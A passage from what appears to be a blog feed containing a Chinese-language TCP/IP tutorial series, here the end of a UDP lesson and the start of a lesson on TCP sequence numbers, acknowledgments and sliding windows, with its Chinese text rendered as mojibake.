title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>éé˜»å¡Socket</li><li>IOå¤šè·¯å¤ç”¨ï¼ˆselect&#x2F;poll&#x2F;epollï¼‰</li><li>Socketé€‰é¡¹è¯¦è§£</li><li>é«˜æ€§èƒ½æœåŠ¡å™¨è®¾è®¡</li><li>å®æˆ˜ï¼šèŠå¤©å®¤æœåŠ¡å™¨</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†UDPåè®®ï¼Œç†è§£äº†å®ƒçš„ç®€å•æ€§å’Œé«˜æ•ˆæ€§ã€‚è™½ç„¶UDPä¸ä¿è¯å¯é ä¼ è¾“ï¼Œä½†åœ¨å¾ˆå¤šå®æ—¶åº”ç”¨ä¸­ï¼Œé€Ÿåº¦æ¯”å¯é æ€§æ›´é‡è¦ã€‚æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ æ›´é«˜çº§çš„Socketç¼–ç¨‹æŠ€æœ¯ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶</title>
    <link href="/2025/11/10/16%E5%A4%A9%EF%BC%9ATCP%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E6%9C%BA%E5%88%B6/"/>
    <url>/2025/11/10/16%E5%A4%A9%EF%BC%9ATCP%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶"><a href="#ç¬¬16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶" class="headerlink" title="ç¬¬16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶"></a>ç¬¬16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>æ·±å…¥ç†è§£TCPåºåˆ—å·å’Œç¡®è®¤å·æœºåˆ¶</li><li>æŒæ¡TCPæ»‘åŠ¨çª—å£åŸç†</li><li>ç†è§£è¶…æ—¶é‡ä¼ æœºåˆ¶</li><li>æŒæ¡å¿«é€Ÿé‡ä¼ å’Œå¿«é€Ÿæ¢å¤ç®—æ³•</li><li>ç†è§£TCPæµé‡æ§åˆ¶</li><li>ç†è§£TCPæ‹¥å¡æ§åˆ¶ç®—æ³•</li><li>å®ç°TCPå¯é æ€§åˆ†æå·¥å…·</li></ul><hr><h2 id="1-TCPå¯é ä¼ è¾“æ¦‚è¿°"><a href="#1-TCPå¯é ä¼ è¾“æ¦‚è¿°" class="headerlink" title="1. TCPå¯é ä¼ è¾“æ¦‚è¿°"></a>1. TCPå¯é ä¼ è¾“æ¦‚è¿°</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯å¯é ä¼ è¾“ï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯å¯é ä¼ è¾“ï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯å¯é ä¼ è¾“ï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯å¯é ä¼ è¾“ï¼Ÿ</h3><p><strong>å¯é ä¼ è¾“çš„ä¿è¯</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> æ•°æ®æ— å·®é”™<br>   â””â”€ é€šè¿‡æ ¡éªŒå’Œæ£€æµ‹<br><br><span class="hljs-bullet">2.</span> æ•°æ®ä¸ä¸¢å¤±<br>   â””â”€ é€šè¿‡ç¡®è®¤å’Œé‡ä¼ <br><br><span class="hljs-bullet">3.</span> æ•°æ®ä¸é‡å¤<br>   â””â”€ é€šè¿‡åºåˆ—å·å»é‡<br><br><span class="hljs-bullet">4.</span> æ•°æ®æŒ‰åºåˆ°è¾¾<br>   â””â”€ é€šè¿‡åºåˆ—å·æ’åº<br><br><span class="hljs-bullet">5.</span> æµé‡æ§åˆ¶<br>   â””â”€ é˜²æ­¢å‘é€æ–¹å‘é€è¿‡å¿«<br><br><span class="hljs-bullet">6.</span> æ‹¥å¡æ§åˆ¶<br>   â””â”€ é˜²æ­¢ç½‘ç»œè¿‡è½½<br></code></pre></td></tr></table></figure><h3 id="1-2-å¯é ä¼ è¾“çš„æ ¸å¿ƒæœºåˆ¶"><a href="#1-2-å¯é ä¼ è¾“çš„æ ¸å¿ƒæœºåˆ¶" class="headerlink" title="1.2 å¯é ä¼ è¾“çš„æ ¸å¿ƒæœºåˆ¶"></a>1.2 å¯é ä¼ è¾“çš„æ ¸å¿ƒæœºåˆ¶</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚         TCPå¯é ä¼ è¾“æœºåˆ¶                   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ <span class="hljs-number">1</span>. åºåˆ—å· (Sequence Number)             â”‚<br>â”‚    â””â”€ æ ‡è¯†æ¯ä¸ªå­—èŠ‚                       â”‚<br>â”‚                                          â”‚<br>â”‚ <span class="hljs-number">2</span>. ç¡®è®¤åº”ç­” (ACK)                       â”‚<br>â”‚    â””â”€ ç¡®è®¤æ”¶åˆ°çš„æ•°æ®                     â”‚<br>â”‚                                          â”‚<br>â”‚ <span class="hljs-number">3</span>. è¶…æ—¶é‡ä¼  (Retransmission)            â”‚<br>â”‚    â””â”€ è¶…æ—¶æœªæ”¶åˆ°ACKåˆ™é‡ä¼                 â”‚<br>â”‚                                          â”‚<br>â”‚ <span class="hljs-number">4</span>. æ»‘åŠ¨çª—å£ (Sliding Window)            â”‚<br>â”‚    â””â”€ æµé‡æ§åˆ¶å’Œæ•ˆç‡æå‡                 â”‚<br>â”‚                                          â”‚<br>â”‚ <span class="hljs-number">5</span>. å¿«é€Ÿé‡ä¼  (Fast Retransmit)           â”‚<br>â”‚    â””â”€ æ”¶åˆ°<span class="hljs-number">3</span>ä¸ªé‡å¤ACKç«‹å³é‡ä¼              â”‚<br>â”‚                                          â”‚<br>â”‚ <span class="hljs-number">6</span>. æ‹¥å¡æ§åˆ¶ (Congestion Control)        â”‚<br>â”‚    â””â”€ æ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…ã€å¿«é€Ÿæ¢å¤         â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><hr><h2 id="2-åºåˆ—å·å’Œç¡®è®¤å·"><a href="#2-åºåˆ—å·å’Œç¡®è®¤å·" class="headerlink" title="2. åºåˆ—å·å’Œç¡®è®¤å·"></a>2. åºåˆ—å·å’Œç¡®è®¤å·</h2><h3 id="2-1-åºåˆ—å·æœºåˆ¶"><a href="#2-1-åºåˆ—å·æœºåˆ¶" class="headerlink" title="2.1 åºåˆ—å·æœºåˆ¶"></a>2.1 åºåˆ—å·æœºåˆ¶</h3><p><strong>åºåˆ—å·ï¼ˆSequence Numberï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä½œç”¨ï¼šæ ‡è¯†å‘é€çš„æ¯ä¸ªå­—èŠ‚åœ¨å­—èŠ‚æµä¸­çš„ä½ç½®<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>32ä½ï¼ŒèŒƒå›´ï¼š0 ~ 4,294,967,295 (çº¦4GB)<br><span class="hljs-bullet">- </span>è¶…è¿‡æœ€å¤§å€¼ä¼šå›ç»•ï¼ˆwraparoundï¼‰<br><span class="hljs-bullet">- </span>åˆå§‹åºåˆ—å·ï¼ˆISNï¼‰åœ¨è¿æ¥æ—¶éšæœºé€‰æ‹©<br><br>ç¤ºä¾‹ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   å­—èŠ‚æµï¼šHELLO WORLD                    â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚   ä½ç½®ï¼š  0 1 2 3 4 5 6 7 8 9 10        â”‚<br>â”‚   å­—ç¬¦ï¼š  H E L L O   W O R L D         â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>å¦‚æœISN = 1000ï¼š<br><span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;H&#x27;</span> çš„åºåˆ—å·ï¼š1000<br><span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;E&#x27;</span> çš„åºåˆ—å·ï¼š1001<br><span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;L&#x27;</span> çš„åºåˆ—å·ï¼š1002<br><span class="hljs-bullet">- </span>...<br><span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;D&#x27;</span> çš„åºåˆ—å·ï¼š1010<br></code></pre></td></tr></table></figure><p><strong>TCPæ®µçš„åºåˆ—å·</strong>ï¼š</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs excel">TCPæ®µçš„åºåˆ—å· = è¯¥æ®µç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºåˆ—å·<br><br>ç¤ºä¾‹ï¼š<br>å‘é€ <span class="hljs-string">&quot;HELLO WORLD&quot;</span> (<span class="hljs-number">11</span>å­—èŠ‚)<br><br>æ–¹æ¡ˆ<span class="hljs-number">1</span>ï¼šä¸€æ¬¡å‘é€<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ SEQ=<span class="hljs-number">1000</span>, Data=<span class="hljs-string">&quot;HELLO WORLD&quot;</span> â”‚<br>â”‚ é•¿åº¦ï¼š<span class="hljs-number">11</span>å­—èŠ‚                  â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>æ–¹æ¡ˆ<span class="hljs-number">2</span>ï¼šåˆ†ä¸¤æ¬¡å‘é€<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ SEQ=<span class="hljs-number">1000</span>, Data=<span class="hljs-string">&quot;HELLO &quot;</span>      â”‚  (<span class="hljs-number">6</span>å­—èŠ‚)<br>â”‚ SEQ=<span class="hljs-number">1006</span>, Data=<span class="hljs-string">&quot;WORLD&quot;</span>       â”‚  (<span class="hljs-number">5</span>å­—èŠ‚)<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ä¸‹ä¸€ä¸ªæ®µçš„SEQï¼š<br>= å½“å‰SEQ + å½“å‰æ®µæ•°æ®é•¿åº¦<br>= <span class="hljs-number">1000</span> + <span class="hljs-number">11</span> = <span class="hljs-number">1011</span><br></code></pre></td></tr></table></figure><h3 id="2-2-ç¡®è®¤å·æœºåˆ¶"><a href="#2-2-ç¡®è®¤å·æœºåˆ¶" class="headerlink" title="2.2 ç¡®è®¤å·æœºåˆ¶"></a>2.2 ç¡®è®¤å·æœºåˆ¶</h3><p><strong>ç¡®è®¤å·ï¼ˆAcknowledgment Numberï¼‰</strong>ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ä½œç”¨ï¼šå‘Šè¯‰å¯¹æ–¹æœŸæœ›æ¥æ”¶çš„ä¸‹ä¸€ä¸ªå­—èŠ‚çš„åºåˆ—å·<br><br>å«ä¹‰ï¼š<br><span class="hljs-attribute">ACK</span> <span class="hljs-operator">=</span> n è¡¨ç¤º <span class="hljs-string">&quot;æˆ‘å·²ç»æ”¶åˆ°äº†åºåˆ—å· &lt; n çš„æ‰€æœ‰æ•°æ®&quot;</span><br><br>ç‰¹ç‚¹ï¼š<br>- ç´¯ç§¯ç¡®è®¤ï¼ˆCumulative ACKï¼‰<br>- ç¡®è®¤å·ä¹‹å‰çš„æ‰€æœ‰æ•°æ®éƒ½å·²æ”¶åˆ°<br></code></pre></td></tr></table></figure><p><strong>ç¡®è®¤ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">å‘é€æ–¹                                     æ¥æ”¶æ–¹<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1000, Len=100 (&quot;æ•°æ®1&quot;)             </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                  ACK=1100                </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string">    (å·²æ”¶åˆ°1000-1099ï¼ŒæœŸæœ›1100)           </span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1100, Len=50 (&quot;æ•°æ®2&quot;)              </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                  ACK=1150                </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string">    (å·²æ”¶åˆ°1100-1149ï¼ŒæœŸæœ›1150)           </span>|<br></code></pre></td></tr></table></figure><p><strong>ç´¯ç§¯ç¡®è®¤çš„é—®é¢˜</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">å‘é€æ–¹å‘é€äº†3ä¸ªæ®µï¼š<br>  æ®µ1: <span class="hljs-attribute">SEQ</span>=1000, <span class="hljs-attribute">Len</span>=100<br>  æ®µ2: <span class="hljs-attribute">SEQ</span>=1100, <span class="hljs-attribute">Len</span>=100<br>  æ®µ3: <span class="hljs-attribute">SEQ</span>=1200, <span class="hljs-attribute">Len</span>=100<br><br>æƒ…å†µ1ï¼šå…¨éƒ¨æ”¶åˆ°<br>  æ¥æ”¶æ–¹å›å¤ï¼š<span class="hljs-attribute">ACK</span>=1300 âœ…<br><br>æƒ…å†µ2ï¼šæ®µ2ä¸¢å¤±<br>  æ®µ1åˆ°è¾¾ â†’ å›å¤ <span class="hljs-attribute">ACK</span>=1100<br>  æ®µ3åˆ°è¾¾ â†’ è¿˜æ˜¯å›å¤ <span class="hljs-attribute">ACK</span>=1100ï¼ˆæœŸæœ›1100ï¼‰<br><br>  é—®é¢˜ï¼šå‘é€æ–¹ä¸çŸ¥é“æ®µ3æ˜¯å¦æ”¶åˆ°<br>  è§£å†³ï¼šSACKï¼ˆé€‰æ‹©æ€§ç¡®è®¤ï¼‰æ‰©å±•<br></code></pre></td></tr></table></figure><h3 id="2-3-åºåˆ—å·å›ç»•é—®é¢˜"><a href="#2-3-åºåˆ—å·å›ç»•é—®é¢˜" class="headerlink" title="2.3 åºåˆ—å·å›ç»•é—®é¢˜"></a>2.3 åºåˆ—å·å›ç»•é—®é¢˜</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åºåˆ—å·æ˜¯32ä½ï¼š0 ~ 4,294,967,295 (çº¦4GB)<br><br>é«˜é€Ÿç½‘ç»œé—®é¢˜ï¼š<br><span class="hljs-bullet">-</span> 10 Gbps ç½‘ç»œ<br><span class="hljs-bullet">-</span> å‘é€é€Ÿåº¦ï¼š1.25 GB/s<br><span class="hljs-bullet">-</span> åºåˆ—å·è€—å°½æ—¶é—´ï¼š4GB Ã· 1.25GB/s â‰ˆ 3.2ç§’<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-bullet">1.</span> PAWS (Protection Against Wrapped Sequence numbers)<br>   â””â”€ ä½¿ç”¨æ—¶é—´æˆ³é€‰é¡¹<br><span class="hljs-bullet">2.</span> TCPçª—å£æ‰©å¤§é€‰é¡¹<br>   â””â”€ å‡å°‘æ•°æ®æ®µæ•°é‡<br></code></pre></td></tr></table></figure><hr><h2 id="3-æ»‘åŠ¨çª—å£æœºåˆ¶"><a href="#3-æ»‘åŠ¨çª—å£æœºåˆ¶" class="headerlink" title="3. æ»‘åŠ¨çª—å£æœºåˆ¶"></a>3. æ»‘åŠ¨çª—å£æœºåˆ¶</h2><h3 id="3-1-ä¸ºä»€ä¹ˆéœ€è¦æ»‘åŠ¨çª—å£ï¼Ÿ"><a href="#3-1-ä¸ºä»€ä¹ˆéœ€è¦æ»‘åŠ¨çª—å£ï¼Ÿ" class="headerlink" title="3.1 ä¸ºä»€ä¹ˆéœ€è¦æ»‘åŠ¨çª—å£ï¼Ÿ"></a>3.1 ä¸ºä»€ä¹ˆéœ€è¦æ»‘åŠ¨çª—å£ï¼Ÿ</h3><p><strong>åœæ­¢ç­‰å¾…åè®®çš„é—®é¢˜</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">åœæ­¢ç­‰å¾… (Stop-and-Wait)ï¼š<br>1. å‘é€ä¸€ä¸ªæ®µ<br>2. ç­‰å¾…ACK<br>3. æ”¶åˆ°ACKåå‘é€ä¸‹ä¸€ä¸ªæ®µ<br><br>æ•ˆç‡ï¼šéå¸¸ä½<br><br>ç¤ºä¾‹ï¼š<br>RTT = 100ms<br>æ•°æ®æ®µå¤§å° = 1KB<br><br>æ—¶é—´çº¿ï¼š<br><span class="hljs-attribute">t</span>=0ms:    å‘é€æ®µ1<br><span class="hljs-attribute">t</span>=100ms:  æ”¶åˆ°ACK1<br><span class="hljs-attribute">t</span>=100ms:  å‘é€æ®µ2<br><span class="hljs-attribute">t</span>=200ms:  æ”¶åˆ°ACK2<br><span class="hljs-built_in">..</span>.<br><br>ååé‡ = 1KB / 100ms = 10KB/s = 80Kbps<br><br>å³ä½¿å¸¦å®½æ˜¯1Gbpsï¼Œä¹Ÿåªèƒ½ç”¨åˆ°80Kbpsï¼âŒ<br></code></pre></td></tr></table></figure><p><strong>æ»‘åŠ¨çª—å£è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">è¿ç»­å‘é€å¤šä¸ªæ®µï¼Œä¸ç”¨ç­‰å¾…ACK<br><br>ç¤ºä¾‹ï¼ˆçª—å£å¤§å°=4ï¼‰ï¼š<br><span class="hljs-attribute">t</span>=0ms:    å‘é€æ®µ1ã€æ®µ2ã€æ®µ3ã€æ®µ4<br><span class="hljs-attribute">t</span>=100ms:  æ”¶åˆ°ACK1ï¼Œçª—å£æ»‘åŠ¨ï¼Œå‘é€æ®µ5<br><span class="hljs-attribute">t</span>=105ms:  æ”¶åˆ°ACK2ï¼Œçª—å£æ»‘åŠ¨ï¼Œå‘é€æ®µ6<br><span class="hljs-built_in">..</span>.<br><br>ååé‡å¤§å¹…æå‡ï¼âœ…<br></code></pre></td></tr></table></figure><h3 id="3-2-å‘é€çª—å£"><a href="#3-2-å‘é€çª—å£" class="headerlink" title="3.2 å‘é€çª—å£"></a>3.2 å‘é€çª—å£</h3><p><strong>å‘é€çª—å£ç»“æ„</strong>ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs armasm">å­—èŠ‚æµï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ å·²å‘é€  â”‚  å·²å‘é€   â”‚   å¯ä»¥å‘é€    â”‚    ä¸èƒ½å‘é€   â”‚<br>â”‚ å·²ç¡®è®¤  â”‚  æœªç¡®è®¤   â”‚   (çª—å£å†…)    â”‚   (çª—å£å¤–)    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>    â†‘          â†‘             â†‘              â†‘<br>   <span class="hljs-built_in">P1</span>         <span class="hljs-built_in">P2</span>            <span class="hljs-built_in">P3</span>             <span class="hljs-built_in">P4</span><br><br><span class="hljs-symbol">P1:</span> å·²å‘é€å¹¶å·²ç¡®è®¤çš„æœ€åä¸€ä¸ªå­—èŠ‚<br><span class="hljs-symbol">P2:</span> å·²å‘é€ä½†æœªç¡®è®¤çš„æœ€åä¸€ä¸ªå­—èŠ‚<br><span class="hljs-symbol">P3:</span> å…è®¸å‘é€çš„æœ€åä¸€ä¸ªå­—èŠ‚<br><span class="hljs-symbol">P4:</span> æœªæ¥çš„æ•°æ®<br><br>å‘é€çª—å£ = <span class="hljs-built_in">P3</span> - <span class="hljs-built_in">P1</span><br>å¯ç”¨çª—å£ = <span class="hljs-built_in">P3</span> - <span class="hljs-built_in">P2</span><br>å·²å‘é€æœªç¡®è®¤ = <span class="hljs-built_in">P2</span> - <span class="hljs-built_in">P1</span><br></code></pre></td></tr></table></figure><p><strong>çª—å£æ»‘åŠ¨è¿‡ç¨‹</strong>ï¼š</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs tap">åˆå§‹çŠ¶æ€ï¼ˆçª—å£å¤§å°=6ï¼‰ï¼š<br>â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”<br>â”‚<span class="hljs-number"> 1 </span> â”‚<span class="hljs-number"> 2 </span> â”‚<span class="hljs-number"> 3 </span> â”‚<span class="hljs-number"> 4 </span> â”‚<span class="hljs-number"> 5 </span> â”‚<span class="hljs-number"> 6 </span> â”‚<span class="hljs-number"> 7 </span> â”‚<span class="hljs-number"> 8 </span> â”‚<span class="hljs-number"> 9 </span> 